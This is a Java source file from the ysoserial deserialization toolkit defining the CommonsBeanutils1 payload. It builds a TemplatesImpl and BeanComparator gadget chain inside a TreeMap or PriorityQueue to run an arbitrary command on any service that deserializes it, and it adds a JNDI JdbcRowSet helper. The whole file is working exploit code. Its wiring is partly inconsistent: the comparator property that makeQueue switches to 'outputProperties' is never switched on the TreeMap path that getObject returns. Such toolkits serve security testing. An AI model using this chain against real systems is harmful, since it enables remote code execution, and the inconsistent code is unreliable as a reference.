package ysoserial.payloads;

import com.sun.rowset.JdbcRowSetImpl;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.math.BigInteger;
import java.util.Comparator;
import java.util.HashMap;
import java.util.PriorityQueue;

import java.util.TreeMap;
import org.apache.commons.beanutils.BeanComparator;

import org.apache.commons.dbcp.datasources.InstanceKeyDataSource;
import org.apache.commons.dbcp.datasources.SharedPoolDataSource;
import sun.misc.Unsafe;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1", "commons-logging:commons-logging:1.2"})
@Authors({ Authors.FROHOFF })
public class CommonsBeanutils1 implements ObjectPayload<Object> {

	public Object getObject(final String ... command) throws Exception {
		final Object templates = Gadgets.createTemplatesImpl(command);
		// mock method name until armed
		final BeanComparator comparator = new BeanComparator("activeServers");
		return makeTreeMap(templates, comparator);
	}

    public static JdbcRowSetImpl makeJNDIRowSet ( String jndiUrl ) throws Exception {
        JdbcRowSetImpl rs = new JdbcRowSetImpl();
        rs.setDataSourceName(jndiUrl);
        rs.setMatchColumn("foo");
        Reflections.getField(javax.sql.rowset.BaseRowSet.class, "listeners").set(rs, null);
        return rs;
    }

    public static PriorityQueue<Object> makeQueue(Object templates, Comparator comparator) throws Exception {
        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        // switch method called by comparator
        Reflections.setFieldValue(comparator, "property", "outputProperties");

        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = templates;
        return queue;
    }

    public static TreeMap<Object, Object> makeTreeMap ( Object tgt, Comparator comparator ) throws Exception {
        TreeMap<Object, Object> tm = new TreeMap<>(comparator);

        Class<?> entryCl = Class.forName("java.util.TreeMap$Entry");
        Constructor<?> entryCons = entryCl.getDeclaredConstructor(Object.class, Object.class, entryCl);
        entryCons.setAccessible(true);
        Field leftF = Reflections.getField(entryCl, "left");

        Field rootF = Reflections.getField(TreeMap.class, "root");
        Object root = entryCons.newInstance(tgt, tgt, null);
        leftF.set(root, entryCons.newInstance(tgt, tgt, root));
        rootF.set(tm, root);
        Reflections.setFieldValue(tm, "size", 2);
        return tm;
    }

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsBeanutils1.class, args);
	}
}
